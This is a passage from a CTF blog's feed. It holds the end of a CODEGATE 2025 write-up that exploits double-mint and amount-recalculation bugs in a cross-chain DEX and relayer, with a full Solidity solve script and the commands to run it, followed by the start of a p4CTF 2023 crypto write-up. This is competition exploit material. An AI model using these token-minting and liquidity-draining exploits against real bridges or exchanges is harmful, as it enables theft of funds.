&lt;p&gt;However, we can&amp;rsquo;t repeat this process for larger amounts without crashing the relayer - the swap will burn the same amount of tokens we are minted on the opposite chain - if that chain doesn&amp;rsquo;t have sufficient liquidity, the burn call reverts and &lt;strong&gt;relayers for both chains crash&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Relayers crashing was especially annoying when I first tried this exploit, I could for example mint 1,000,000 MOODENG on CODE chain, but this would crash the relayers, and since there is insufficient USDC and PURR on the CODE chain DEX, I couldn&amp;rsquo;t solve the challenge this way - we have to use some method of moving and gaining tokens on one chain without crashing the relayer in the process.&lt;/p&gt;
&lt;h4 id=&#34;solving-the-challenge&#34;&gt;Solving the challenge&lt;/h4&gt;
&lt;p&gt;Actually implementing the solve scripts for this challenge was a pain, since for whatever reason, &lt;a href=&#34;https://github.com/foundry-rs/foundry/issues/6825&#34;&gt;Foundry&amp;rsquo;s &lt;code&gt;--skip-simulation&lt;/code&gt; doesn&amp;rsquo;t work&lt;/a&gt;. Since there was cross chain components involved, this meant that we had to run several parts of the solve script manually. For example, if we bridged USDC from GATE to CODE chain, then tried to swap our USDC on CODE chain, Foundry&amp;rsquo;s simulation of the script wouldn&amp;rsquo;t pass since it doesn&amp;rsquo;t simulation the off-chain relayer and thinks we have no tokens on CODE chain, therefore we had to seperate these parts.&lt;/p&gt;
&lt;p&gt;Steps to solve the challenge:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;do the aforementioned swaps to move liquidity from GATE chain to CODE chain. We repeatedly swap USDC for PURR, then PURR to USDC, to move PURR tokens from the GATE chain to the CODE chain. Due to the amount recalculation bug, we can increase our swap amount by 19 USDC with each swap.&lt;/li&gt;
&lt;li&gt;once sufficient (&amp;gt;1200) PURR tokens are moved, we perform a similar process for the MOODENG tokens, but this time only 1 swap is required, as we already have enough USDC to buy 1200 MOODENG tokens. We thus receive 600 MOODENG from CODE DEX, and another 600 from GATE DEX&lt;/li&gt;
&lt;li&gt;finally, with all the liquidity moved to the CODE chain, we can use our double-minting bug to gain large amounts of USDC tokens, then use the USDC tokens to swap for PURR and MOODENG. The relayer crashes, but it doesn&amp;rsquo;t matter anymore at this point, since all the liquidity is moved to CODE chain and we don&amp;rsquo;t need to perform further cross-chain actions.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Solve script:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1337&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;1337&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;solve_script.s.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from &amp;#34;forge-std/Script.sol&amp;#34;;
import {Counter} from &amp;#34;../src/Counter.sol&amp;#34;;
import &amp;#34;../src/Setup.sol&amp;#34;;
import &amp;#34;../src/FaucetLogic.sol&amp;#34;;
import &amp;#34;../src/Token.sol&amp;#34;;
import &amp;#34;../src/DEX.sol&amp;#34;;

contract Solve is Script {
    bytes32 USDC = keccak256(abi.encodePacked(&amp;#34;USDC&amp;#34;));
    bytes32 PURR = keccak256(abi.encodePacked(&amp;#34;PURR&amp;#34;));
    bytes32 MOO = keccak256(abi.encodePacked(&amp;#34;MOODENG&amp;#34;));
    Token tokenA_gate;
    Token tokenB_gate;
    Token tokenC_gate;
    Token tokenA_code;
    Token tokenB_code;
    Token tokenC_code;
    DEX dex_gate;
    DEX dex_code;
    uint privkey;
    address myAddr;
    FaucetLogic faucet;
    Setup setup;

    function setUp() public {
        privkey = vm.envUint(&amp;#34;PRIVKEY&amp;#34;);
        myAddr = vm.addr(privkey);
        
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_GATE&amp;#34;));

        setup = Setup(address(vm.envAddress(&amp;#34;SETUP&amp;#34;)));
        faucet = FaucetLogic(setup.faucet());
        
        tokenA_gate = Token(setup.tokenA());
        tokenB_gate = Token(setup.tokenB());
        tokenC_gate = Token(setup.tokenC());
        dex_gate = DEX(setup.dex());

        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));

        tokenA_code = Token(setup.tokenA());
        tokenB_code = Token(setup.tokenB());
        tokenC_code = Token(setup.tokenC());
        dex_code = DEX(setup.dex());
    }

    function run() public {
        // claim tokens and approve
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_GATE&amp;#34;));
        vm.startBroadcast(privkey);

        faucet.claimToken(address(tokenA_gate));
        faucet.claimToken(address(tokenB_gate));
        faucet.claimToken(address(tokenC_gate));

        tokenA_gate.approve(address(dex_gate), type(uint).max);
        tokenB_gate.approve(address(dex_gate), type(uint).max);
        tokenC_gate.approve(address(dex_gate), type(uint).max);

        // swap all tokens to USDC and bridge to CODE chain
        logBalances_gate();

        console.log(&amp;#34;swapping all for USDC and bridging&amp;#34;);
        dex_gate.swap(myAddr, PURR, USDC, 100 ether, false);
        dex_gate.swap(myAddr, MOO, USDC, 100 ether, false);
        dex_gate.swap(myAddr, USDC, USDC, 139 ether, true);

        logBalances_gate();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_0() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        // approve
        tokenA_code.approve(address(dex_code), type(uint).max);
        tokenB_code.approve(address(dex_code), type(uint).max);
        tokenC_code.approve(address(dex_code), type(uint).max);
        
        // swap USDC for PURR
        // and back
        // draining GATE DEX liquidity
        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 0;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_1() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        // swap USDC for PURR
        // and back
        // draining GATE DEX liquidity
        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 0;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_2() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 1;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_3() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 2;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_4() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 3;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_5() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 4;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_usdc_purr_6() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);

        logBalances_code();

        uint amount = 139 &amp;#43; 19 * 5;
        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
        amount &amp;#43;= 19;
        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_swap_moo_0() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);
        
        logBalances_code();

        // move MOO liquidity from GATE to CODE chain
        dex_code.swap(myAddr, PURR, USDC, 1200 ether, false);
        dex_code.swap(myAddr, USDC, MOO, 229 ether, false);

        logBalances_code();

        vm.stopBroadcast();
    }
    
    function code_final_solve_0() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);
        
        logBalances_code();

        // get more USDC than DEX has
        dex_code.swap(myAddr, MOO, USDC, 1200 ether, false);

        // abuse double-mint to get large amount of USDC
        // on CODE chain.
        // this crashes relayer but doesnt matter anymore
        // since all required liquidity is moved to CODE chain
        for (int i=0; i&amp;lt;20; i&amp;#43;&amp;#43;) {
            dex_code.swap(myAddr, USDC, USDC, 350 ether, false);
        }

        logBalances_code();

        vm.stopBroadcast();
    }

    function code_final_solve_1() public {
        vm.createSelectFork(vm.envString(&amp;#34;RPCURL_CODE&amp;#34;));
        vm.startBroadcast(privkey);
        
        logBalances_code();

        // swap USDC for required MOO and PURR
        // and solve challenge
        dex_code.swap(myAddr, USDC, PURR, 300 ether, false);
        dex_code.swap(myAddr, USDC, MOO, 300 ether, false);

        logBalances_code();

        setup.solve();

        vm.stopBroadcast();
    }

    function logBalances_gate() public {
        console.log(&amp;#34;\nmy&amp;#34;);
        console.log(&amp;#34;USDC my bal:&amp;#34;, tokenA_gate.balanceOf(address(myAddr)));
        console.log(&amp;#34;PURR my bal:&amp;#34;, tokenB_gate.balanceOf(address(myAddr)));
        console.log(&amp;#34;MOO my bal:&amp;#34;, tokenC_gate.balanceOf(address(myAddr)));
        console.log(&amp;#34;\ndex&amp;#34;);
        console.log(&amp;#34;USDC DEX bal:&amp;#34;, tokenA_gate.balanceOf(address(dex_gate)));
        console.log(&amp;#34;PURR DEX bal:&amp;#34;, tokenB_gate.balanceOf(address(dex_gate)));
        console.log(&amp;#34;MOO DEX bal:&amp;#34;, tokenC_gate.balanceOf(address(dex_gate)));
    }

    function logBalances_code() public {
        console.log(&amp;#34;\nmy&amp;#34;);
        console.log(&amp;#34;USDC my bal:&amp;#34;, tokenA_code.balanceOf(address(myAddr)));
        console.log(&amp;#34;PURR my bal:&amp;#34;, tokenB_code.balanceOf(address(myAddr)));
        console.log(&amp;#34;MOO my bal:&amp;#34;, tokenC_code.balanceOf(address(myAddr)));
        console.log(&amp;#34;\ndex&amp;#34;);
        console.log(&amp;#34;USDC DEX bal:&amp;#34;, tokenA_code.balanceOf(address(dex_code)));
        console.log(&amp;#34;PURR DEX bal:&amp;#34;, tokenB_code.balanceOf(address(dex_code)));
        console.log(&amp;#34;MOO DEX bal:&amp;#34;, tokenC_code.balanceOf(address(dex_code)));
    }
}


&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Running the solve script is split into several parts due to the cross chain component. Note that this is done after setting code for the faucet.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig run --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_0 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_1 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_2 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_3 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_4 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_5 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_usdc_purr_6 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_swap_moo_0 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_final_solve_0 --broadcast &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forge script Solve --sig code_final_solve_1 --broadcast
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;./img/solve.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 80%&#34;  /&gt;


&lt;p&gt;Get flag &lt;code&gt;codegate2025{f166ec27fa5efeac43470f8ab0f662effc56666a62d64998eafdca85a5fe3b54}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And blood the challenge!!&lt;/p&gt;

  &lt;img src=&#34;./img/blood.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 70%&#34;  /&gt;


&lt;p&gt;Thanks to &lt;code&gt;snwo&lt;/code&gt; for authoring this challenge!&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;CODEGATE 2025 Finals CTF was a lot of fun - it was great meeting people from other teams! I also  participated in CODEGATE last year in the Junior division (and also came 7th lol), and it was a good experience, so I am glad I could attend once again!&lt;/p&gt;
&lt;p&gt;It was also my first time pulling an all nighter for the CTF - since it was 24 hours ranging from 10am to 10am the next day, a lot of teams also stayed the entire time.&lt;/p&gt;
&lt;p&gt;I would like to thank organisers and challenge authors for the CTF, and my team for their tremendous effort in the CTF, and I hope to attend again next year!&lt;/p&gt;
&lt;p&gt;As always, if you spotted any errors/typos in the blog, or have questions, feel free to DM/ping me on discord &lt;code&gt;thesavageteddy&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Btw, props to organisers for putting our team name emojis ü§¨üá´üá∑üõπüêª onto both the badge and banner lol.&lt;/p&gt;

  &lt;img src=&#34;./img/badge.jpg&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 30%&#34;  /&gt;


</content>
    </item>
    
    <item>
      <title>CTF Writeups - p4CTF Finals 2023 in Poland</title>
      <link>https://TheSavageTeddy.github.io/featured/p4ctf-finals-2023/</link>
      <pubDate>Thu, 22 Jun 2023 23:20:00 +1000</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/featured/p4ctf-finals-2023/</guid>
      <description>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;p4CTF Finals was an onsite event held in June 2023 in Katowice, Poland. Together with Emu Exploit, I qualified for event in the p4CTF qualifiers and had the opportunity to go to Poland to meet and compete with many top teams in the world, including &lt;a href=&#34;https://twitter.com/FlatNetworkOrg&#34;&gt;&lt;code&gt;The Flat Network Society&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/DragonSectorCTF&#34;&gt;&lt;code&gt;Dragon Sector&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/justCatTheFish&#34;&gt;&lt;code&gt;justCatTheFish&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/hxpctf&#34;&gt;&lt;code&gt;hxp&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/0rganizers&#34;&gt;&lt;code&gt;0rganizers&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/allesctf&#34;&gt;&lt;code&gt;ALLES&lt;/code&gt;&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/fluxfingers&#34;&gt;&lt;code&gt;FluxFingers&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Before we could compete in the event, we had to first get to Poland, which proved to be a pain as our travel time was 50 hours - 30 hours across three flights to Paris, and 20 hours on the bus to Katowice. However, it was definetely worth the time, as we got to also see some tourist attractions in Paris!&lt;/p&gt;</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;p4CTF Finals was an onsite event held in June 2023 in Katowice, Poland. Together with Emu Exploit, I qualified for event in the p4CTF qualifiers and had the opportunity to go to Poland to meet and compete with many top teams in the world, including &lt;a href=&#34;https://twitter.com/FlatNetworkOrg&#34;&gt;&lt;code&gt;The Flat Network Society&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/DragonSectorCTF&#34;&gt;&lt;code&gt;Dragon Sector&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/justCatTheFish&#34;&gt;&lt;code&gt;justCatTheFish&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/hxpctf&#34;&gt;&lt;code&gt;hxp&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/0rganizers&#34;&gt;&lt;code&gt;0rganizers&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/allesctf&#34;&gt;&lt;code&gt;ALLES&lt;/code&gt;&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/fluxfingers&#34;&gt;&lt;code&gt;FluxFingers&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Before we could compete in the event, we had to first get to Poland, which proved to be a pain as our travel time was 50 hours - 30 hours across three flights to Paris, and 20 hours on the bus to Katowice. However, it was definetely worth the time, as we got to also see some tourist attractions in Paris!&lt;/p&gt;

  &lt;img src=&#34;./img/emu_paris.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-height: 40em&#34;  /&gt;


&lt;p&gt;Also, thanks to the &lt;a href=&#34;https://twitter.com/p4_team&#34;&gt;p4CTF team&lt;/a&gt; for hosting an amazing event, and our sponsors who made the trip possible!&lt;/p&gt;
&lt;p&gt;Below are writeups for some challenges I solved during the 24h CTF, which were quite unique!&lt;/p&gt;
&lt;p&gt;For example, for sanity check, you had to go to the p4 organiser&amp;rsquo;s desk and eat (edible) bugs in order to obtain the paper containing network credentials for some of the challenges, and the flag was &lt;code&gt;p4{eat-bugs-gain-sanity}&lt;/code&gt; which I thought was quite funny. The bugs were crunchy.&lt;/p&gt;
&lt;h1 id=&#34;challenge-overview&#34;&gt;Challenge Overview&lt;/h1&gt;
&lt;p&gt;There were a total of 18 challenges - I mostly solved crypto, and got a funny unintended solution on a misc. Below are writeups of some of these challenges:&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Challenge&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/p4ctf-finals-2023/#pallas-crypto---12-solves&#34;&gt;Pallas&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;crypto&lt;/td&gt;
          &lt;td&gt;12&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/p4ctf-finals-2023/#aes_observed-crypto---6-solves&#34;&gt;aes_observed&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;crypto&lt;/td&gt;
          &lt;td&gt;6&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/p4ctf-finals-2023/#pepega-packets-misc---5-solves&#34;&gt;Pepega Packets&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;misc&lt;/td&gt;
          &lt;td&gt;5&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Enjoy!&lt;/p&gt;
&lt;h1 id=&#34;pallas-crypto---12-solves&#34;&gt;Pallas (crypto) - 12 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Tell me my secret&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;We are given python source &lt;code&gt;task.py&lt;/code&gt; and the output &lt;code&gt;output.txt&lt;/code&gt;.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;task.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import *

from sec import secret
print(len(secret))

text   = b&amp;#34;The Pallas&amp;#39;s cat is a highly specialised predator of small mammals, which it catches by stalking or ambushing near exits of burrows.&amp;#34;

def bits_to_bytes(l):
	l = [str(f) for f in l]
	l=&amp;#34;&amp;#34;.join(l)
	final = [l[i * 8:(i &amp;#43; 1) * 8] for i in range((len(l) &amp;#43; 8 - 1) // 8 )]
	final = [int(x,2) for x in final]
	return bytes(final)

def bytes_to_bits(bb):
	r = &amp;#34;&amp;#34;
	for c in bb:
		r &amp;#43;= bin(c)[2:].rjust(8,&amp;#34;0&amp;#34;)
	r= list(map(int, r))
	return r

def my_crypto_inner(text, secret):
	tl = len(text)
	sl = len(secret)
	enc = [0]*len(text)
	for i in range(tl):
		enc[i]=text[i]
		enc[i]^=secret[i % sl]
		for div in range(1, tl):
			if i%div == 0:
				enc[i] ^= enc[(i-div) % sl]
			if i&amp;gt;0 and div%i == 0:
				enc[i] ^= text[(i-div) % sl]
	return enc

def my_crypto(text, secret):
	text = bytes_to_bits(text)
	secret = bytes_to_bits(secret)
	res = my_crypto_inner(text,secret)
	return bits_to_bytes(res)

encrypted = my_crypto(text,secret)
print(encrypted)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;&lt;code&gt;output.txt&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x8b\xbe\x00\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;I&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f\xe8\x87\x8e\xa3\xec&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\x8a\xbd\xd4\xe7\x92&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa1\x8c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x15&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x06\x8a\xa8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa6\xcd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xaf\xce\xbc\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;go&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc4\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xac\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd5\x88\\\x07\xa9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;z&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\xc2\x9f\x9c\x89\xf8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x87&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Ut&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5\xdc\xdd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a9&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe0\xc5\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb8\xf6\xbe\n\xb1\xd0\xdc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd6\xfc\x15\x13\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5&lt;/span&gt;&lt;span 